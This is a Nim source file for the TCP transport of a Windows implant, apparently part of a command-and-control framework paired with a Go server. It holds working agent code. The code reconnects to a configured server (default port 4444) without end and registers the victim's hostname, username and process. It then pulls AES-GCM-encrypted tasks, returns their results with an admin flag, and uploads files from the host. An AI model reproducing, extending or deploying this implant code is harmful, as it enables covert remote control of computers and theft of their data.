## TCP transport for Nim agent.
## Wire-compatible with Go transport_tcp.go.
## Protocol: {"t":"type","p":payload} with 4-byte LE length prefix.
## beacon/result payloads are AES-GCM encrypted; register is plaintext JSON.
import std/[net, json, base64, strutils]
import winim/lean
import config, crypto

proc getEnvStr(k, default: string): string =
  var buf = newWideCString(newString(512))
  let n = GetEnvironmentVariableW(newWideCString(k), buf, 512)
  if n == 0: return default
  $buf

proc exeName*(): string =
  var buf = newWideCString(newString(MAX_PATH))
  let n = GetModuleFileNameW(0, buf, MAX_PATH)
  if n == 0: return "agent.exe"
  let full = $buf
  let i = max(full.rfind('\\'), full.rfind('/'))
  if i < 0: full else: full[i+1..^1]

type
  AgentTransport* = object
    host*:    string
    port*:    int
    sock*:    net.Socket
    agentId*: string
    aesKey*:  seq[byte]

  TaskWire* = object
    id*:      int64
    typ*:     string
    args*:    string
    payload*: seq[byte]

# ── framing ──────────────────────────────────────────────────────────────────

proc recvExact(sock: net.Socket; n: int): string =
  result = newString(n)
  var pos = 0
  while pos < n:
    let got = sock.recv(cast[pointer](addr result[pos]), n - pos)
    if got <= 0: raise newException(IOError, "tcp: connection closed")
    inc pos, got

proc readFrame(sock: net.Socket): string =
  let hdr = recvExact(sock, 4)
  let n = uint32(ord(hdr[0])) or (uint32(ord(hdr[1])) shl 8) or
          (uint32(ord(hdr[2])) shl 16) or (uint32(ord(hdr[3])) shl 24)
  if n == 0 or n > 32*1024*1024'u32: return ""
  recvExact(sock, int(n))

proc writeFrame(sock: net.Socket; data: string) =
  var hdr = newString(4)
  let n = uint32(data.len)
  hdr[0] = char(n and 0xff)
  hdr[1] = char((n shr 8) and 0xff)
  hdr[2] = char((n shr 16) and 0xff)
  hdr[3] = char((n shr 24) and 0xff)
  sock.send(hdr)
  if data.len > 0: sock.send(data)

# ── connection ────────────────────────────────────────────────────────────────

proc newTransport*(): AgentTransport =
  var srv = ServerUrl
  if srv.startsWith("tcp://"):
    srv = srv[6..^1]
  let colonIdx = srv.rfind(':')
  if colonIdx < 0:
    result.host = srv
    result.port = 4444
  else:
    result.host = srv[0..<colonIdx]
    result.port = parseInt(srv[colonIdx+1..^1])

proc doConnect(t: var AgentTransport) =
  while true:
    try:
      let s = net.newSocket()
      s.connect(t.host, Port(t.port))
      t.sock = s
      return
    except:
      try: t.sock.close() except: discard
      Sleep(5000)

proc doRegister(t: var AgentTransport): bool =
  let req = %*{
    "t": "register",
    "p": %*{
      "hostname":     getEnvStr("COMPUTERNAME", "UNKNOWN"),
      "username":     getEnvStr("USERNAME", "UNKNOWN"),
      "os":           "windows/amd64",
      "pid":          int(GetCurrentProcessId()),
      "transport":    "tcp",
      "sleep_sec":    SleepSec,
      "jitter_pct":   JitterPct,
      "process_name": exeName()
    }
  }
  writeFrame(t.sock, $req)
  let frame = readFrame(t.sock)
  if frame.len == 0: return false
  try:
    let resp = parseJson(frame)
    if resp["t"].getStr() != "register_resp": return false
    let p = resp["p"]
    t.agentId = p["agent_id"].getStr()
    t.aesKey  = cast[seq[byte]](base64.decode(p["aes_key"].getStr()))
    return true
  except: return false

# ── public API ────────────────────────────────────────────────────────────────

proc register*(t: var AgentTransport): bool =
  t.doConnect()
  t.doRegister()

proc reconnect(t: var AgentTransport) =
  while true:
    try: t.sock.close() except: discard
    t.doConnect()
    if t.doRegister(): return
    Sleep(5000)

proc beacon*(t: var AgentTransport): seq[TaskWire] =
  try:
    let msg = %*{"t": "beacon", "p": newJNull()}
    writeFrame(t.sock, $msg)
    let frame = readFrame(t.sock)
    if frame.len == 0: return @[]
    let resp = parseJson(frame)
    if resp["t"].getStr() != "tasks": return @[]
    let encB64 = resp["p"].getStr()
    if encB64.len == 0: return @[]
    let enc   = cast[seq[byte]](base64.decode(encB64))
    let plain = openGCM(t.aesKey, enc)
    if plain.len == 0: return @[]
    let j     = parseJson(cast[string](plain))
    for tw in j["tasks"]:
      var task = TaskWire(
        id:   tw["id"].getBiggestInt(),
        typ:  tw["type"].getStr(),
        args: tw{"args"}.getStr(""))
      let pl = tw{"payload"}.getStr("")
      if pl.len > 0: task.payload = cast[seq[byte]](base64.decode(pl))
      result.add(task)
  except:
    t.reconnect()

proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
                      output, errStr: string; isAdmin: bool) =
  try:
    let plain  = cast[seq[byte]]($(%*{
      "task_id": taskId, "output": output, "error": errStr, "is_admin": isAdmin}))
    let enc    = sealGCM(t.aesKey, plain)
    let encB64 = base64.encode(cast[string](enc))
    let msg    = %*{"t": "result", "p": encB64}
    writeFrame(t.sock, $msg)
  except:
    t.reconnect()

proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
  t.sendResultAdmin(taskId, output, errStr, false)

proc uploadFile*(t: var AgentTransport; taskId: int64;
                 filename: string; data: seq[byte]) =
  try:
    let inner  = %*{"task_id": taskId, "filename": filename,
                    "data": base64.encode(cast[string](data))}
    let plain  = cast[seq[byte]]($inner)
    let enc    = sealGCM(t.aesKey, plain)
    let encB64 = base64.encode(cast[string](enc))
    let msg    = %*{"t": "upload", "p": encB64}
    writeFrame(t.sock, $msg)
  except:
    t.reconnect()

proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
  return @[]
